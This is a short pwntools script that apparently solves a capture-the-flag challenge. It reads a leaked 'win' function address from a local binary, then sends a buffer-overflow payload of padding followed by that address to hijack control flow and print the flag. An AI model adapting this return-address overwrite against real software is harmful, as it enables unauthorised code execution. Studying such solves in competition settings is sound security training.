from pwn import *

# p=remote("challenges.ctf.compfest.id",9013)
p = process("./chall")

p.recvuntil(b'secret : ')
win = int(p.recvline().strip(), 16)
log.info(f'win address => {hex(win)}')


# Construct the payload
payload = b'\x00' * 1
payload += b'a'*39
payload += p64(win)

p.sendline(payload)
p.recvuntil(b'mwehehe\n')

flag = p.recvline().strip().decode()
log.info(f"Flag => {flag}")
p.close()
